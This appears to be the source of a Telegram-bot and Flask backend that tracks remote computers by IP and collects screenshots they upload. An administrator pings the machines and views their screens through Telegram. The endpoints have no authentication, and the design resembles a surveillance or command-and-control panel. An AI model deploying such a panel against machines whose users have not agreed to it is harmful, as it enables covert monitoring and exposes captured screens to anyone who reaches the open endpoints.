import requests
import telebot
import time
import os
import json
from flask import Flask, request, jsonify
from threading import Thread
from telebot import types
from commands import register_commands
from ping3 import ping
from werkzeug.utils import secure_filename

# Инициализация Flask приложения
app = Flask(__name__)

# Проверка наличия файла конфигурации
config_path = os.path.join(os.path.dirname(__file__), "files/botFiles/config.json")
if not os.path.exists(config_path):
    with open(config_path, "w") as f:
        json.dump({"token": "YOUR_API_TOKEN", "admin": "YOUR_ADMIN_ID"}, f)

computerlist_path = os.path.join(os.path.dirname(__file__), "files/botFiles/computer-list.txt")
if not os.path.exists(computerlist_path):
    with open(computerlist_path, "w") as f:
        f.write("")

def read_config():
    with open(config_path, 'r') as f:
        config = json.load(f)
    return config['token'], config['admin']

# Чтение токена и ID администратора из конфигурации
token, admin = read_config()
print(f"token: {token}\nadmin_chat: {admin}")

# Инициализация бота с токеном
bot = telebot.TeleBot(token)

online_status = {}

def add_computer(ip):
    with open('files/botFiles/computer-list.txt', 'a') as f:
        f.write(ip + '\n')

def read_computer_list():
    if not os.path.exists('files/botFiles/computer-list.txt'):
        return []
    with open('files/botFiles/computer-list.txt', 'r') as f:
        return [line.strip() for line in f.readlines()]

def load_online_status():
    computers = read_computer_list()
    current_time = time.time()
    for ip in computers:
        online_status[ip] = current_time  # Устанавливаем текущее время как последнее время пинга
    print(computers,"- computers")

def update_ping(ip):
    current_time = time.time()
    online_status[ip] = current_time  # Запоминаем время последнего пинга
    if ip not in read_computer_list():
        add_computer(ip)
        print("new computer added: " + ip)

def check_online_status():
    current_time = time.time()
    online_computers = []
    for ip, last_ping in online_status.items():
        if current_time - last_ping <= 60:
            online_computers.append((ip, '🟢', last_ping))  # Сохраняем время последнего пинга
        else:
            online_computers.append((ip, '🔴', last_ping))  # Оффлайн
    return online_computers

@bot.message_handler(commands=['ping'])
def get_online(message):
    online_computers = check_online_status()
    if not online_computers:
        bot.send_message(message.chat.id, "Нет доступных серверов для пинга.")
        return

    response = "Выберите сервер для пинга:\n"
    markup = types.InlineKeyboardMarkup()  # Создаем клавиатуру

    for ip, status, last_ping in online_computers:
        button = types.InlineKeyboardButton(text=f"{ip} - {status}", callback_data=f"ping_{ip}")
        markup.add(button)

    bot.send_message(message.chat.id, response, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('ping_'))
def handle_ping(call):
    ip = call.data.split('_')[1]  # Извлекаем IP из callback_data
    response = f"Пингую сервер {ip}..."
    bot.send_message(call.message.chat.id, response)  # Отправляем сообщение о начале пинга

    try:
        # Выполняем пинг
        ping_time = ping(ip)
        if ping_time is not False:
            response = f"Сервер {ip} пингован: {ping_time * 1000:.2f} мс."
            update_ping(ip)  # Обновляем время последнего пинга
        else:
            response = f"Не удалось пинговать сервер {ip}. Возможно, он недоступен."
    except Exception as e:
        response = f"Ошибка пинга сервера {ip}: {str(e)}"

    bot.answer_callback_query(call.id)  # Подтверждаем нажатие кнопки
    bot.send_message(call.message.chat.id, response)

    # Добавляем кнопку для повторного пинга
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="Повторить пинг", callback_data=f"ping_{ip}")
    markup.add(button)
    bot.send_message(call.message.chat.id, "Повторить пинг?", reply_markup=markup)

@app.route('/screenshot', methods=['POST'])
def screenshot():
    # Получаем изображение из запроса
    image = request.get_data()

    # Удаляем существующий файл с тем же IP-адресом
    import os
    dir = 'files/get'
    for file in os.listdir(dir):
        if file.startswith(request.remote_addr + '-'):
            os.remove(os.path.join(dir, file))

    # Сохраняем изображение в папку files/get
    timestamp = time.strftime("%H-%M-%S")
    filename = f"{request.remote_addr}-{timestamp}.jpg"
    with open(f"files/get/{filename}", "wb") as f:
        f.write(image)

    # Отправляем сообщение о получении изображения
    return jsonify({"message": "Изображение получено!"})

@bot.message_handler(commands=['getscreenshot'])
def get_screencum(message):
    online_computers = check_online_status()
    if not online_computers:
        bot.send_message(message.chat.id, "Нет доступных серверов для пинга.")
        return
                                #COCAЛ?
    response = "Выберите сервер:\n" #COCAЛ?
                                #COCAЛ?
    markup = types.InlineKeyboardMarkup()  # Создаем клавиатуру

    for ip, status, last_ping in online_computers:
        button = types.InlineKeyboardButton(text=f"{ip} - {status}", callback_data=f"screenshot_{ip}")
        markup.add(button)

    bot.send_message(message.chat.id, response, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('screenshot_'))
def handle_screenshot_request(call):
    ip = call.data.split('_')[1]  # Получаем IP из callback_data
    dir_path = "files/get"  # Путь к папке с изображениями

    # Ищем файл, который начинается с выбранного IP
    matching_files = [f for f in os.listdir(dir_path) if f.startswith(ip)]

    if matching_files:
        # Если найден хотя бы один файл, отправляем самый последний (по времени)
        latest_file = max(matching_files, key=lambda f: os.path.getmtime(os.path.join(dir_path, f)))
        image_path = os.path.join(dir_path, latest_file)

        with open(image_path, 'rb') as photo:
            bot.send_photo(call.message.chat.id, photo)
    else:
        bot.send_message(call.message.chat.id, f"Изображение для сервера {ip} не найдено.")



@bot.message_handler(commands=['pingall'])
def ping_all(message):
    response = "Список всех пингованных серверов:\n\n"
    current_time = time.time()

    for ip in online_status.keys():
        try:
            # Ping the server
            ping_time = ping(ip)

            # Determine status and milliseconds
            if ping_time is not None:
                status = '🟢'  # Server is online
                milliseconds = int(ping_time * 1000)  # Convert to milliseconds
                response += f"{ip} - {status} - {milliseconds} мс\n"
            else:
                status = '🔴'  # Server is offline
                milliseconds = "Нет подключения"
                response += f"{ip} - {status} - {milliseconds}\n"

            # Update the online_status dictionary
            online_status[ip] = current_time if status == '🟢' else current_time

        except Exception as e:
            # Handle errors during ping
            status = '🔴'  # Mark as offline in case of error
            response += f"{ip} - {status} - Ошибка пинга: {str(e)}\n"
            online_status[ip] = current_time  # Update timestamp

    # Send the response to the user
    bot.send_message(message.chat.id, response)

@app.route('/', methods=['POST'])
def ping_route():
    data = request.json
    ip = data.get('ip')
    if not ip:
        return jsonify({"error": "IP address is required"}), 400
    try:
        update_ping(ip)  # Обновляем время пинга для данного IP
        return jsonify({"message": f"Ping updated for {ip}"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/", methods=['DELETE'])
def stop():
    global bot
    bot.stop_polling()  # Останавливаем бота
    print("BOT HAS STOPPED BY WEB OPTION")  # Логируем остановку бота
    response = jsonify({"message": "Bot stopped"})  # Создаем JSON-ответ
    response.status_code = 200  # Устанавливаем статус код
    response.call_on_close(lambda: os._exit(0))  # Завершаем процесс после отправки ответа
    return response  # Возвращаем ответ

if __name__ == "__main__":
    load_online_status()  # Загружаем статус онлайн компьютеров
    register_commands(bot)

    # Запускаем бота в отдельном потоке
    bot_thread = Thread(target=bot.polling, daemon=True)
    bot_thread.start()
    try:
        ip = requests.get('https://api.ipify.org').text
        bot.send_message(admin, f"Bot is online. Server-IP: {ip}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to get server IP: {e}")

    # Запускаем Flask приложение в основном потоке
    app.run(host='0.0.0.0', port=5000)